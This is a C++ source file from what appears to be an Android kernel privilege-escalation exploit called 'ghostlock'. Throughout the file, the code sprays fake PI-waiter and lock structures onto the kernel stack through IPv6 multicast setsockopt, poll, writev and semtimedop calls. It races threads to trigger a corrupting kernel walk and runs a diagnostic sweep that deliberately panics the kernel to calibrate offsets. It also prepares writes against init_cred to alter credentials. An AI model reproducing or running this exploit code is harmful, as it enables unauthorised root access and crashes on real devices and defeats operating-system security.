#include <netinet/in.h>
#include <poll.h>
#include <sys/uio.h>
#include <cstring>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_status.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

namespace ghostlock::route {
    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        if (!request) {
            status.step = 57;
            status.error_number = EINVAL;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* v12.7: DIAG mode — waiter_off==65535 selects it (the validator
         * only needs waiter_off+lock_offset+8 <= buffer_size, so the DIAG
         * conf pairs it with buffer_size=65615). Fill the whole stamp with
         * the upstream marker pattern: gsr[j] = 0xD00D000000000000 | (j*8).
         * The walk then dereferences a marker as the ghost's lock and the
         * panic fault address IS the marker — decode j = (far & 0xfff)/8,
         * true waiter_off = j*8 - 7*8 (field7 lands at gsr word j). One
         * panicked shot therefore calibrates the Sony shift exactly, the
         * same way the upstream derived shift=21 from their m1 DIAG fire. */
        if (*layout.waiter_offset == 65535) {
            /* v12.9: multi-carrier DIAG sweep. Three shots (shift 23/7/3)
             * all faulted on the same kstack residue tail (…3320), i.e. the
             * ghost never fell inside the mcast gsr window at all — the
             * Sony frame-depth delta may simply be larger than 264B, or
             * negative (the ghost deeper than the gsr copy). Rather than
             * burn one reboot per guess, sweep carriers whose verbatim
             * stack copy sits at a DIFFERENT stack depth. A carrier whose
             * window misses the ghost leaves the kernel alive (residue
             * faults are the risk, but a miss that survives lets the next
             * carrier run in the same boot), so the sweep tries all of
             * them in one attempt and logs which one was in flight.
             *
             * Decoding: each word is tagged 0xD?DD0000000000|<j*8>. The
             * walk dereferences the ghost's lock field, so the panic fault
             * address IS the tag: carrier = the D?DD prefix,
             * j = (far & 0xfff)/8, and the true waiter_off for that
             * carrier = j*8 - 56 (field7 = lock lands at word j). */
            struct diag_carrier {
                const char *name;
                uint64_t tag;
                size_t bytes;
            };
            /* v12.10: semop goes LAST. Android 12+ blocks the SysV IPC
             * syscalls in the app seccomp filter — a blocked syscall is
             * SIGSYS/KILL_PROCESS, which would abort the sweep before the
             * other carriers ever run. Everything seccomp-safe runs first. */
            const diag_carrier carriers[] = {
                    {"mcast",  0xD00D000000000000ULL, 264},  /* group_source_req, 33 words   */
                    {"poll",   0xD22D000000000000ULL, 256},  /* nfds=32, POLL_STACK_ALLOC   */
                    {"writev", 0xD33D000000000000ULL, 128},  /* UIO_FASTIOV=8 iovecs        */
                    {"semop",  0xD11D000000000000ULL, 512},  /* 32 sembufs (SEMOPM=32)      */
            };
            const size_t kMax = 512;
            unsigned char buf[kMax];
            int32_t dfd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
            int32_t seq = 0;
            for (const diag_carrier &c: carriers) {
                memset(buf, 0, sizeof(buf));
                const size_t words = c.bytes / 8;
                for (size_t j = 0; j < words; ++j) {
                    const uint64_t marker = c.tag | (static_cast<uint64_t>(j) * 8);
                    memcpy(buf + j * 8, &marker, sizeof(marker));
                }
                errno = 0;
                if (strcmp(c.name, "mcast") == 0) {
                    if (dfd >= 0)
                        (void) setsockopt(dfd, IPPROTO_IPV6, 44, buf, (socklen_t) c.bytes);
                } else if (strcmp(c.name, "poll") == 0) {
                    (void) poll(reinterpret_cast<struct pollfd *>(buf),
                                static_cast<nfds_t>(c.bytes / 8), 0);
                } else if (strcmp(c.name, "writev") == 0) {
                    if (dfd >= 0)
                        (void) writev(dfd, reinterpret_cast<const struct iovec *>(buf),
                                      c.bytes / sizeof(struct iovec));
                } else {
                    /* semtimedop: copy_from_user runs before the semid
                     * lookup, so an invalid semid still lands the plant.
                     * Zero timeout so it can never sleep. */
                    struct timespec zero = {.tv_sec = 0, .tv_nsec = 0};
                    (void) syscall(192, 0, buf, 32, &zero);
                }
                pr_info("mcast DIAG carrier=%s words=%zu errno=%d; firing walk\n",
                        c.name, words, errno);
                session::g_exploit_session.race.consumer_calls.store(0);
                session::g_exploit_session.race.consumer_go.store(++seq);
                for (int32_t spin = 0; spin < 100000000 &&
                                       session::g_exploit_session.race.consumer_calls.load() == 0;
                     spin++)
                    __asm__ volatile ("yield" ::: "memory");
                /* Give the chain time to deref and fault before moving on;
                 * a hit panics us out of this loop entirely. */
                for (volatile int32_t dwell = 0; dwell < 6000000; dwell++)
                    __asm__ volatile ("yield" ::: "memory");
                session::g_exploit_session.race.consumer_go.store(0);
                pr_info("mcast DIAG carrier=%s survived (no overlap)\n", c.name);
            }
            if (dfd >= 0) close(dfd);
            pr_info("mcast DIAG sweep complete: no carrier overlapped the ghost\n");
            status.step = 0;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        const size_t waiter_off = static_cast<size_t>(*layout.waiter_offset);
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));

        /* v12.3: plant the FULL compact image with UPSTREAM field semantics.
         * Fields 0-2 (tree node) = ZERO — upstream slide.c: "tree_pc=0 → the
         * first rb_erase takes the ROOT path and writes only into the dm
         * page; a kernel pointer here routes the parent-path writes into
         * kernel memory and derails the walk" (exactly panic #12: x27 =
         * 0xaae9535e6fec3320, residue read through a parent chain that left
         * our page). The write rides the PI node instead: field3/5 =
         * fake_right/fake_left (the same V/T pair encode_compact_waiter
         * plants in the W0 node), field6/7 = fake_task/fake_lock,
         * field8 = prio. */
        const uint64_t prio_word = static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO);
        const struct {
            int32_t field;
            uint64_t value;
        } words[] = {
                {0, 0},
                {1, 0},
                {2, 0},
                {3, (session::g_exploit_session.heap.current.fake_right)},
                {4, 0},
                {5, (session::g_exploit_session.heap.current.fake_left)},
                {6, (session::g_exploit_session.heap.current.fake_task)},
                {7, (session::g_exploit_session.heap.current.fake_lock)},
                {8, prio_word},
                {9, 0},
        };
        bool encoded = true;
        for (const auto &w: words) {
            size_t byte = waiter_off + static_cast<size_t>(w.field) * 8;
            if (byte + 8 > stamp_size) {
                encoded = false;
                break;
            }
            memcpy(stamp + byte, &w.value, sizeof(w.value));
        }
        if (!encoded) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast word table overflows stamp: waiter_off=%zu "
                       "buffer=%zu\n", waiter_off, stamp_size);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));

        /* v12.0: the 5.10.236 upstream carrier — AF_INET6 + IPPROTO_IPV6
         * opt 44 (group_source_req copy, 264B, verbatim, not rewritten on
         * return). The sockaddr validation fails AFTER copy_from_user has
         * already planted the 264B on this thread's kstack, so the EINVAL
         * is expected and harmless. */
        int32_t fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            status.step = 60;
            status.error_number = errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        int32_t stamp_result =
                setsockopt(fd, IPPROTO_IPV6, 44, stamp, (socklen_t) sizeof(stamp));
        status.step = 61;
        status.error_number = errno;
        session::g_exploit_session.race.consumer_go.store(1);
        /* v12.0: re-stamp duty cycle (upstream: a single stamp is torn by the
         * next syscall's own frames; GAP_US >= 300 gives the plant a resident
         * fraction for the consumer to fire into). Re-issue until the
         * consumer lands or the round budget expires. */
        uint64_t freq = 0;
        __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(freq));
        if (!freq) freq = 19200000;
        const uint64_t gap_ticks = 300ULL * freq / 1000000ULL;
        for (int32_t round = 0; round < 10000 &&
                                session::g_exploit_session.race.consumer_calls.load() == 0;
             round++) {
            (void) setsockopt(fd, IPPROTO_IPV6, 44, stamp, (socklen_t) sizeof(stamp));
            uint64_t start = 0;
            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(start));
            while (true) {
                uint64_t now = 0;
                __asm__ volatile("mrs %0, cntvct_el0" : "=r"(now));
                if (now - start >= gap_ticks) break;
                if (session::g_exploit_session.race.consumer_calls.load() != 0) break;
                __asm__ volatile("yield" ::: "memory");
            }
        }
        for (int32_t spin = 0; spin < 100000000 &&
                           session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
            __asm__ volatile (


        "yield"
        ::: "memory");
        session::g_exploit_session.race.consumer_go.store(0);
        while (session::g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (


        "yield"
        ::: "memory");
        close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace ghostlock::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        if (!support::activate_prebuilt_page()) {
            pr_warning("W2 fast repair activation failed\n");
            return false;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace ghostlock::route
#endif
